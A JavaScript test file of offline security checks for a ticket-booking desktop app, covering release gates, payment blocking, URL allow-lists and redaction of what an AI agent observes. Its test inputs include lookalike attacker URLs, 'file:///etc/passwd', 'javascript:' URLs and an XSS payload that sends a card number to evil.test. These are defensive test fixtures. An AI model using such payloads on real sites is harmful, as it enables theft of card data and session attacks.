'use strict';
/** AB-15 cross-component offline E2E; NO tickets, live HTTP or payment cards. */
const test=require('node:test');
const assert=require('node:assert/strict');
const fs=require('node:fs');
const path=require('node:path');
const os=require('node:os');
const crypto=require('node:crypto');
const {RehearsalDriver}=require('./booking/rehearsal-driver.cjs');
const {PaymentAttemptLedger}=require('./booking/payment-attempts.cjs');
const {PaymentReconciler}=require('./booking/reconciliation.cjs');
const {evaluate}=require('../../../scripts/release-readiness.cjs');
const {PRODUCTION_API,allowedApi,allowedAccountEndpoint}=require('./account.cjs');
const {resolveOfficialSaleUrl,isSafeWebUrl}=require('./security.cjs');
const {localProfile,verifyOfflineFixture,assessRuntime}=require('./booking/provider-runtime.cjs');
const {evaluateEffectiveCapability}=require('./booking/capability-policy.cjs');
const {normalizeOptions,normalizeOfferTargets,projectAIObservation}=require('./booking/observation-redaction.cjs');
const {strictProposal}=require('./booking/action-validator.cjs');
const plan=Object.freeze({
  id:crypto.randomUUID(),quantity:2,budgetMinor:200000,currency:'HKD',
  requireTogether:true,allowFallback:true
});
function lab(t){
  const rootDir=fs.mkdtempSync(path.join(os.tmpdir(),'tixbam-ab15-'));
  t.after(()=>fs.rmSync(rootDir,{recursive:true,force:true}));
  return new RehearsalDriver({rootDir,plan,ownerId:'offline-user-test'});
}
async function review(d,scenario='standard'){
  await d.start(scenario,1001);
  for(let i=0;i<3;i++)await d.next();
  assert.equal(d.state.status,'review',scenario);
}
test('release readiness is a verifiable HOLD, never a live approval',()=>{
  const a=evaluate();
  assert.equal(a.staticChecksPassed,true,JSON.stringify(a.failedChecks));
  assert.equal(a.status,'HOLD');
  assert.equal(a.livePaymentEnabled,false);
  assert.equal(a.automaticCheckoutAvailable,false);
  assert.equal(a.gates.length,4);
  assert.deepEqual(a.gates.map(g=>g.status),['HOLD','HOLD','HOLD','HOLD']);
  assert.ok(a.checks.length>=15);
  for(const c of a.checks)assert.equal(c.passed,true,c.id);
});
test('tampering any critical release gate makes security verification fail',()=>{
  const source=file=>{
    const root=path.resolve(__dirname,'../../..');
    const txt=fs.readFileSync(path.join(root,file),'utf8');
    return file==='apps/desktop/electron/booking/capability-policy.cjs'
      ?txt.replace('const RELEASE_APPROVED = false;','const RELEASE_APPROVED = true;')
      :txt;
  };
  const report=evaluate({source});
  assert.equal(report.staticChecksPassed,false);
  assert.ok(report.failedChecks.includes('live-host-kill-switch'));
  assert.equal(report.status,'HOLD');
  assert.equal(report.livePaymentEnabled,false);
});
test('packaged account token never leaves trusted production API; IPC cannot call payment endpoints',()=>{
  assert.equal(allowedApi(PRODUCTION_API,true),true);
  for(const url of [
    'http://127.0.0.1:8000/','http://localhost:8000/',
    'https://tixbam-production.up.railway.app.evil.example/',
    'https://evil.example/',
    'https://user:password@tixbam-production.up.railway.app/',
    'https://tixbam-production.up.railway.app/foo',
    'https://tixbam-production.up.railway.app/?token=x',
    'https://tixbam-production.up.railway.app/#secret'
  ])assert.equal(allowedApi(url,true),false,url);
  assert.equal(allowedApi('http://127.0.0.1:8000/',false),true);
  for(const path of [
    '/v1/admin/automation','/v1/ai/plans','/v1/me/automation/leases/claim',
    '/v1/me/automation/leases/anything','/v1/purchase','/v1/pay',
    'https://evil.example/','/v1/me/orders'
  ])assert.equal(allowedAccountEndpoint('POST',path),false,path);
});
test('hostile provider URLs, ports, lookalikes and credential URLs cannot bind a ticket window',()=>{
  const hostile=[
    'https://www.cityline.com.hk.evil.example/',
    'https://cityline.com.hk:8443/',
    'http://cityline.com.hk/',
    'file:///etc/passwd',
    'javascript:alert(1)',
    'https://foo@cityline.com.hk/',
    'https://www.livenation.hk.evil.org/'
  ];
  for(const url of hostile){
    assert.equal(isSafeWebUrl(url),url.startsWith('https://www.cityline.com.hk.evil.example/')||
      url.startsWith('https://www.livenation.hk.evil.org/'));
    assert.throws(()=>resolveOfficialSaleUrl('cityline',url));
  }
  assert.equal(resolveOfficialSaleUrl('cityline','https://www.livenation.hk/en/event/concert').providerId,'livenation');
});
test('a hostile AI observation never exports card, receipt, URLs or HTML',()=>{
  const malicious='<img src=x onerror=fetch("https://evil.test/?card=4111111111111111")>';
  const privateHost={schemaVersion:1,stage:'offers',challenge:'none',confidence:'partial',
    accountId:'user@example.org',card:'4111111111111111',receipt:'secret-receipt',
    html:malicious,providerUrl:'https://sensitive.example/path'};
  const pub=projectAIObservation(privateHost,[{token:crypto.randomUUID(),kind:'offer'}]);
  const raw=JSON.stringify(pub);
  for(const secret of ['user@example.org','4111111111111111','secret-receipt',malicious,'sensitive.example'])
    assert.equal(raw.includes(secret),false);
  assert.deepEqual(Object.keys(pub),['schemaVersion','stage','challenge','confidence','optionCounts','targets']);
  assert.deepEqual(normalizeOfferTargets({stage:'offers',offers:[{available:true,html:malicious}]},'verified_adapter'),[]);
  assert.deepEqual(normalizeOptions({stage:'options',options:{
    performance:[{id:'javascript:alert(1)',available:true}],
    priceTier:[{id:'VIP',available:true}]
  }},'verified_adapter'),[]);
  assert.equal(strictProposal({action:'SUBMIT_PAYMENT',javascript:malicious}),null);
});
test('reviewed capability profiles and forged Admin flags cannot enable a real charge',()=>{
  const p=localProfile('cityline','1.1.0');
  assert.ok(p);
  const f={schemaVersion:1,sandbox:true,
    url:'https://www.cityline.com.hk/en_US/eventDetail?event=7313',
    eventId:'7313',observedEventId:'7313',stage:'options',
    challenge:'none',providerId:'cityline',capability:'OBSERVE',fixtureSuite:'observe-v1'};
  const cert=verifyOfflineFixture({profile:p,addonVersion:'1.1.0',
    capability:'OBSERVE',fixture:f});
  assert.equal(cert.eligible,true);assert.equal(cert.liveAllowed,false);
  assert.equal(verifyOfflineFixture({profile:{...p,capabilities:{...p.capabilities,
    PAYMENT_EXECUTOR:'verified'}},addonVersion:'1.1.0',capability:'OBSERVE',fixture:f}).eligible,false);
  const status=assessRuntime({providerId:'cityline',addonVersion:'1.1.0',country:'HK',
    capability:'OBSERVE',url:f.url,eventId:f.eventId,killSwitch:false,
    verification:{state:'fixture_verified',capability:'OBSERVE',country:'HK',
      addonVersion:'1.1.0',profileId:p.profileId,fixtureSha256:'e'.repeat(64),
      hostPermission:false,liveExecution:false},
    policy:{capability:'OBSERVE',country:'HK',permissionState:'permitted',permitted:true}});
  assert.equal(status.liveAllowed,false);
  const effective=evaluateEffectiveCapability({providerId:'cityline',addonVersion:'1.1.0',
    country:'HK',capability:'PAYMENT_EXECUTOR',released:true,server:{
      schemaVersion:1,globalKillSwitch:false,items:[{providerId:'cityline',
        country:'HK',published:true,autonomousCheckoutAvailable:true,
        ticketAgentRequired:false,policies:[{capability:'PAYMENT_EXECUTOR',
        country:'HK',permissionState:'permitted',permitted:true}]}]},
    consent:{providerId:'cityline',addonVersion:'1.1.0',country:'HK',
      capability:'PAYMENT_EXECUTOR',expiresAtMs:Date.now()+5000}});
  assert.equal(effective.allowed,false);
});
test('complete offline review → journal → mock receipt; never permit a second charge',async t=>{
  const d=lab(t);
  await review(d);
  await d.next({confirm:true});
  assert.equal(d.adapter.payments,1);
  await d.next();
  assert.equal(d.state.status,'completed');
  const intent=d.runner.paymentIntent;
  const reconcile=new PaymentReconciler({ledger:d.runner.ledger});
  const result=reconcile.inspect(intent.attemptId);
  assert.equal(result.status,'completed');
  assert.equal(result.automaticCheckoutAllowed,false);
  assert.equal(result.purchaseBlocked,true);
  assert.throws(()=>d.runner.ledger.recordCommitIntent({
    runId:crypto.randomUUID(),permit:d.runner.purchasePermit,
    order:d.adapter.order,rehearsal:true
  }),/duplicate_purchase_intent/);
});
test('post-submit timeout + restart + human not-paid report never opens a retry window',async t=>{
  const d=lab(t);
  await review(d,'unknown_charge');
  await d.next({confirm:true});
  assert.equal(d.state.status,'payment_unknown');
  assert.equal(d.adapter.payments,1);
  const attempt=d.runner.paymentIntent,ledger=d.runner.ledger;
  const rec=new PaymentReconciler({ledger});
  const manual=rec.recordManualReview({attemptId:attempt.attemptId,outcome:'reported_not_paid',
    confirmedByUser:true,accountVerified:true,rehearsal:true});
  assert.equal(manual.purchaseBlocked,true);
  await d.simulateRestart();
  assert.equal(d.state.status,'payment_unknown');
  assert.equal(d.state.reconciliation.purchaseBlocked,true);
  assert.equal(d.state.active,false);
  assert.equal(d.state.reconciliation.reviewOutcome,'reported_not_paid');
  await assert.rejects(d.next({confirm:true}),/No active rehearsal step/);
});
test('hostile fixture exceptions / fee drift cannot cause a real or synthetic commit',async t=>{
  const d=lab(t);
  await review(d,'price_change');
  await d.next({confirm:true});
  assert.equal(d.adapter.payments,0);
  assert.equal(d.state.status,'awaiting_user');
  assert.equal(d.runner.ledger.journal.read().filter(x=>x.type==='COMMIT_INTENT_RECORDED').length,0);
});
